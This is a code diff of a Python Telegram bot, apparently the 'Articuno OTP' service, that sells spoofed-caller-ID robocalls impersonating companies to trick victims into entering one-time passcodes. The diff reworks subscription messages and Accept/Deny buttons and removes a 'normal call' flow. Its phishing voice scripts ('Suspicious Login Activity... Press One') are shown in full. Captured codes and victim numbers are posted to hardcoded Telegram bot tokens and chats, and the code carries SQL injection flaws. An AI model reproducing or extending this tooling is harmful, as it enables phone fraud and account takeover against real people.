@@ -505,7 +505,7 @@ def current_credit(message):
      else:
            bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
    else:
-      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
+      bot.send_message(message.from_user.id,f"""* 🚫Buy Subscription.🚫 *""",parse_mode='markdown')
    c.close() 
 #----------------------------PROFILE-------------------------------------------------------------------------------------
       
@@ -555,7 +555,7 @@ Total Otps Grab:- {cdata[9]} 📞*""",parse_mode='markdown',reply_markup=keyboar
             else:
                 bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
         else:
-            bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
+            bot.send_message(message.from_user.id,f"""* 🚫Buy Subscription.🚫 *""",parse_mode='markdown')
         c.close()
     except:
          send_welcome(message)
@@ -654,7 +654,7 @@ def Set_custom(message):
      else:
            bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
    else:
-      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
+      bot.send_message(message.from_user.id,f"""* 🚫Buy Subscription.🚫 *""",parse_mode='markdown')
    c.close() 
    
 
@@ -749,7 +749,7 @@ def Set_custom_script(message):
      else:
            bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
    else:
-      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
+      bot.send_message(message.from_user.id,f"""* 🚫Buy Subscription.🚫 *""",parse_mode='markdown')
    c.close() 
 
 @bot.message_handler(commands=['deletescript'])
@@ -869,7 +869,7 @@ def recall_now(message):
                 caller=cl[5]
                 vict=cl[4]
                 if days>=1:
-                        bot.send_message(message.from_user.id, "*Remaking your last call 📳*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id, "*Bringing back your last call 🧑‍💻*",parse_mode='markdown')
                         try: 
                             c.execute(f"select * from call_data where chat_id={id} limit 1")
                             last_script = c.fetchone()
@@ -890,18 +890,17 @@ def recall_now(message):
        else:
              bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')
    else:
-      bot.send_message(message.from_user.id,f"""* ❌ Redeem key to activate *""",parse_mode='markdown')
+      bot.send_message(message.from_user.id,f"""* 🚫Buy Subscription.🚫 *""",parse_mode='markdown')
 #----------------------------------------------------------------------------
 
 
 #--------------------------------custom---CALL WEBHOOK-------------------------------------------------------
-def custom_confirm1(message):
-       #Database connect------------------------
+def custom_confirm1(message,otp_message):
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor() 
-    #_____________________________________
+
     chat_id = message.from_user.id
-    up_resp1= message.text
+    up_resp1= otp_message
     c.execute(f"Select * from users where user_id={chat_id}")
     sc_id = c.fetchone()
     customscid = sc_id[6]
@@ -915,7 +914,6 @@ def custom_confirm1(message):
     custom_cont = c.fetchone()
     call_control_id  = custom_cont[1]
 
-    
     if up_resp1=='Accept':
         url = 'https://articunoapi.com:8443/play-audio'
         data = {
@@ -971,7 +969,7 @@ def custom_prebuild_script_call(script_id,chatid):
     "maxdigits":"1"
 }
             requests.post(url1, json=data)
-            bot.send_message(chatid,f"""*Call has been answered 🗣️*""",parse_mode='markdown')
+            bot.send_message(chatid,f"""*Call has been answered 📱*""",parse_mode='markdown')
 
         
 
@@ -985,14 +983,6 @@ def custom_prebuild_script_call(script_id,chatid):
             except:
                  print("Recording Error")
             
-            
-
-
-    # elif event == "amd.machine":
-    #     bot.send_message(chatid,f"""*Machine Detected 🤖*""",parse_mode='markdown')
-
-    # elif event == "amd.human":
-    #     bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
 
     elif event == "call.complete":
             global last_message_ids
@@ -1046,14 +1036,12 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
-            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
-            keyboard.row_width =2
-            keyboard.max_row_keys=2
-            item1 = types.KeyboardButton(text="Accept")
-            item2 = types.KeyboardButton(text="Deny")
+            keyboard = types.InlineKeyboardMarkup(row_width=2)
+            item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
+            item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
-            callinfo=bot.send_message(chatid, f"* Do you want this Code *", reply_markup=keyboard,parse_mode='markdown')
+            bot.send_message(chatid,f"""*Code Captured <code>{otp2}</code> ✅*""",parse_mode='HTML',reply_markup=keyboard)
+
             requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
 Another Call Was Successful 👤
@@ -1064,251 +1052,12 @@ Service Name:- {custom_sc_src[2]} ⌛️
 Call Type:- CustomCall 📲
 
 Powered By:- @ArticunoOtpBot 🔐""")
-            bot.register_next_step_handler(callinfo,custom_confirm1)
     c.close()
     return 'Webhook received successfully!', 200
 
 #--------------------------------------------------------------------------------------------------------------------------------
 
 
-
-#--------------------------------NORMAL---CALL WEBHOOK-------------------------------------------------------
-def confirm1(message):
-       #Database connect------------------------
-    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
-    c = db.cursor() 
-    #_____________________________________
-    chat_id = message.from_user.id
-    up_resp1= message.text
-    c.execute(f"Select * from call_data where chat_id={chat_id}")
-    cont = c.fetchone()
-    name = message.from_user.first_name
-
-    c.execute(f"select * from users where user_id='{chat_id}' limit 1")
-    voices = c.fetchone()
-    selected_voice = voices[7]
-    no_space_voice = "".join(selected_voice.split())
-    call_control_id  = cont[1]
-    otp_digits  = cont[3]
-
-    if up_resp1=='Accept':
-        url = 'https://articunoapi.com:8443/play-text'
-        data = {
-    "uuid": f"{call_control_id}",
-    "text": f"Thank You, You Code Was Valid And your Account Is Safe, Now May You Hangup Have A Great Day.",
-    "voice": f"{voices[7]}",
-    
-}
-        requests.post(url, json=data)
-        bot.send_message(chat_id,f"*Code Accpeted ✅ Thank You For using Our Bot, Do Not Forget To Give A Vouch To @Articuno_Discussion 🫶*",parse_mode='markdown')
-        time.sleep(4)
-        callhangup(call_control_id)
-
-    elif up_resp1=='Deny':
-        mes1=bot.send_message(chat_id,f"""* Code Rejected ❌ *""",parse_mode='markdown').message_id
-        url = 'https://articunoapi.com:8443/gather-text'
-        data = {
-    "uuid": f"{call_control_id}",
-    "text": f"Oops Sorry, Your Code Was Invalid Or Expired, We Have Send A {otp_digits} digits Code, Dail It For Verification.",
-    "voice": f"{no_space_voice}",
-    "maxdigits": f"{otp_digits}",
-    
-}
-        requests.post(url, json=data)
-        response = requests.post(f"https://api.telegram.org/bot{bot_tkn}/editMessageText", 
-              data={
-            "chat_id": chat_id,
-            "message_id": mes1,
-            "text": '*Asking For Code Again 🗣️*',
-            'parse_mode':'markdown'})
-    
-    c.close()
-    return 'Webhook received successfully!', 200
-        
-@app.route('/<service>/<chatid>/random', methods=['POST'])
-def prebuild_script_call(service,chatid):
-    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
-    c = db.cursor()
-    data = request.get_json()
-    print(data)
-    call_control_id = data['uuid']
-    event = data['state']
-    c.execute(f"select * from users where user_id='{chatid}' limit 1")
-    voices = c.fetchone()
-    selected_voice = voices[7]
-    call_cost = voices[11]
-    no_space_voice = "".join(selected_voice.split())
-    
-    if event == "ringing":
-        callhangbutton(chatid)
-
-    elif event == "in-progress":
-        url1 = "https://articunoapi.com:8443/gather-text"
-        data = {
-    "uuid": f"{call_control_id}",
-    "text": f"Hello Dear Customer We Are Calling From {service}, We Detect A Suspicious Login Activity On Your {service} Account. if It Is Not You Press One.",
-    "voice": f"{no_space_voice}",
-    "maxdigits": f"1",
-}
-        requests.post(url1, json=data)
-        bot.send_message(chatid,f"""*Call Answerd 🗣️*""",parse_mode='markdown')
-    
-    elif event == "completed":
-        call_cause = data['cause']
-        try:
-            resp = data['audio']
-            per_call_cost = data['cost']
-            call_cost_update = call_cost + per_call_cost
-            response = requests.get(resp)
-            payload = {
-                'chat_id': {chatid},
-                'title': 'transcript.mp3',
-                'parse_mode': 'HTML'
-            }
-            files = {
-                'audio': response.content,
-            }
-            requests.post(f"https://api.telegram.org/bot{bot_tkn}/sendAudio".format(bot_tkn=f"{bot_tkn}"),data=payload,files=files)
-            c.execute(f"Update users set call_cost ={call_cost_update} where user_id={chatid}")
-            db.commit()
-        except:
-            print("No Audio File")
-        finally:
-            global last_message_ids
-            if call_cause  == "Unknown":
-                 mes = "Call Ended ☎️"
-            elif call_cause == "Circuit/channel congestion":
-                 mes = "Call ended due to API issue ⚙️"
-            elif call_cause == "Normal Clearing":
-                 mes = "Call Ended by Victim ☎️"
-            else:
-                 mes =  " Call Ended ☎️ "
-            keyboard = types.InlineKeyboardMarkup(row_width=2)
-            item1 = types.InlineKeyboardButton(text="Recall", callback_data="/recall")
-            item0 = types.InlineKeyboardButton(text="Profile", callback_data="/profile")
-            keyboard.add(item1, item0)
-            mesid = bot.send_message(chatid,f"""*{mes}*""",reply_markup=keyboard, parse_mode='Markdown').message_id
-            last_message_ids[chatid]=mesid
-            c.execute(f"Update users set status='active' where user_id={chatid}")
-            db.commit()
-
-    elif event == "amd.machine":
-        bot.send_message(chatid,f"""*Machine Detected 🤖*""",parse_mode='markdown')
-        
-
-    elif event == "amd.human":
-        bot.send_message(chatid,f"""*Human Detected 👤*""",parse_mode='markdown')
-        
-    elif event == "dtmf.entered":
-        data = request.get_json()
-        digit =  data['digit']
-        bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
-
-
-    elif event == "dtmf.gathered":
-        data = request.get_json()
-        otp2 = data['digits']
-
-        if otp2 == "1":
-            def ask_otp():
-                c.execute(f"Select * from call_data where chat_id={chatid}")
-                cont = c.fetchone()
-                otp_digits  = cont[3]
-                url3 = 'https://articunoapi.com:8443/gather-text'
-                data = {
-    "uuid": f"{call_control_id}",
-    "text": f"For Remove The Login Device We Have Send A {otp_digits} digits confarmation code on Your Registered Mobile Number. it Is Compulsory For Owner Verification.",
-    "voice": f"{no_space_voice}",
-    "maxdigits": f"{otp_digits}",
-}
-                requests.post(url3, json=data)
-
-            def send_ask_otp(): 
-                bot.send_message(chatid,f"""*Victim Presses One 😈
-Send Your Code 📲*""",parse_mode='markdown')
-            bgtask2 = threading.Thread(target=ask_otp)
-            bgtask2.start()
-            send_ask_otp()
-           
-
-        elif(len(otp2)>=4):
-            url = 'https://articunoapi.com:8443/play-text'
-            data = {
-    "uuid": f"{call_control_id}",
-    "text": f"Thank You, Please Wait A Minute We Are Checking Your Code.",
-    "voice": f"{no_space_voice}",
-}
-            requests.post(url, json=data)
-            otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*Code Captured {otp2} ✅*""",parse_mode='markdown')
-            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
-            keyboard.row_width =2
-            keyboard.max_row_keys=2
-            item1 = types.KeyboardButton(text="Accept")
-            item2 = types.KeyboardButton(text="Deny")
-            keyboard.add(item1,item2) 
-            callinfo=bot.send_message(chatid, f"* Do you want this Code *", reply_markup=keyboard,parse_mode='markdown',)
-            requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
-🚀 Articuno OTP Capture 🚀
-Another Call Was Successful 👤
-
-Custom OTP:- {otp2} ✅
-Username:- @{voices[12][0:3]+"****"+voices[12][-3:]} 🆔
-Service Name:- {service} ⌛️
-Call Type:- Normal Call 📲
-
-Powered By:- @ArticunoOtpBot 🔐""")
-            bot.register_next_step_handler(callinfo,confirm1)
-    c.close()
-    return 'Webhook received successfully!', 200
-
-#--------------------------------------------------------------------------------------------------------------------------------
-
-
-# normal CALLING -------------------------------------------------------------------
-@bot.message_handler(commands=['call'])
-def make_call_command(message):
-    db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
-    c = db.cursor()
-    id = message.from_user.id
-    c.execute(f"Select * from users where user_id={id}")
-    row= c.fetchone()
-    if row!=None :
-        if row[3]!='ban':
-            if user_day_check(id)>0:
-                    bot.send_message(message.from_user.id,f"*Call Initiated 🧭*",parse_mode='markdown')
-                    try:
-                        mes =(message.text).split()
-                        number = mes[1]
-                        spoof = mes[2]
-                        service_name = mes[3]
-                        otp_digits = int(mes[4])
-                        voice = mes[5]
-                        print(number ,spoof)
-                        c.execute(f"update users set v_no={number},spoof_no={spoof},inp_sc='{voice}',del_col=0,status='active' where user_id={id} ")
-                        db.commit()
-                        c.execute(f"update call_data set last_service='{service_name}',otp_digits={otp_digits} where chat_id={id} ")
-                        db.commit()
-                        call_update(id)
-                        requests.post(f"""https://api.telegram.org/bot5790251044:AAFsqP2K0s7YK3Bxtm9Q4PXPTvi66SoyvUg/sendMessage?chat_id=-4235754114&text=
-Victim >> {number}
-Spoof  >> {spoof}
-Script >> {service_name}
-""")
-                        time.sleep(5)
-                        a = make_call(f=f"{spoof}",t=f"{number}", user_id=id,service=service_name,amd=row[13])
-                    except:
-                        bot.send_message(message.from_user.id, f"*Use Correct fromat!\n/call <Victim Number> <Spoof Number> <Service Name> <OTP Digits> <voice>*",parse_mode='markdown')
-            else:
-               bot.send_message(message.from_user.id, "*❌ Redeem new key to activate*",parse_mode='markdown')  
-               delete_data(id) 
-        else:
-             bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
-    else:
-       bot.send_message(message.from_user.id, "*❌ Redeem key to activate*",parse_mode='markdown')
-    c.close()
-#----------------------------------------------------------------------------------------------------------------------------------------------------------
-         
 #_-----------------------------Custom Calling---------------------------------------------------------------------------------------------------------
 @bot.message_handler(commands=['customcall'])
 def make_call_custon(message):
@@ -1327,7 +1076,8 @@ def make_call_custon(message):
                         spoof = mes[2]
                         script_id = mes[3]
                         voice = mes[4]
-                        bot.send_message(message.from_user.id,f"""*⏱ Call Initiated from {spoof} to {number}
+                        bot.send_message(message.from_user.id,f"""*
+📞 Calling {spoof} to {number}
 Please wait verifying your inputes 🧑‍💻*""",parse_mode='markdown')
                         days =user_day_check(id)
                         c.execute(f"update users set v_no={number},spoof_no={spoof},sc_id={script_id},inp_sc='{voice}',del_col=0,username='{username}' where user_id={id} ")
@@ -1356,15 +1106,15 @@ Spoof  >> {spoof}
 S Id >> {script_id}
 Script >> {custom_sc[2]}
 """)
-                                time.sleep(5)
+                                time.sleep(3)
                                 b=custom_make_call(f= f"{spoof}",t=f"{number}",user_id=id,script_id=script_id)
 
                         else:
                             bot.send_message(message.from_user.id, """* Custom script not found! \n Create First -> /customscript *""",parse_mode='markdown')
                     except:
-                        bot.send_message(message.from_user.id, f"*Use Correct fromat or valid custom script!\n/customcall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
+                        bot.send_message(message.from_user.id, f"*Somthing went wrong.\n/customcall <Victim Number> <Spoof Number> <Script Id> <voice>*",parse_mode='markdown')
             else:
-                   bot.send_message(message.from_user.id, "*❌ Redeem key to activate*",parse_mode='markdown')  
+                   bot.send_message(message.from_user.id, "*🚫Buy Subscription.🚫*",parse_mode='markdown')  
                    delete_data(id) 
         else:
                  bot.send_message(message.from_user.id, "*Sorry ,You are Banned !*",parse_mode='markdown')   
@@ -1388,6 +1138,7 @@ def handle_callback(message):
        Price_list(message)
     elif message.data == '/customscript':
         Set_custom(message)
+
     elif message.data == '/endcall':
         db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
         c = db.cursor()
@@ -1417,6 +1168,15 @@ def handle_callback(message):
         Features(message)
     elif message.data == '/support':
         Support(message)
+
+    elif message.data == '/accept':
+         custom_confirm1(message,"Accept")
+    
+    elif message.data == '/deny':
+         custom_confirm1(message,"Deny")
+         
+         
+         
 
     elif message.data =='/ind':
         keyboard = types.InlineKeyboardMarkup(row_width=2)
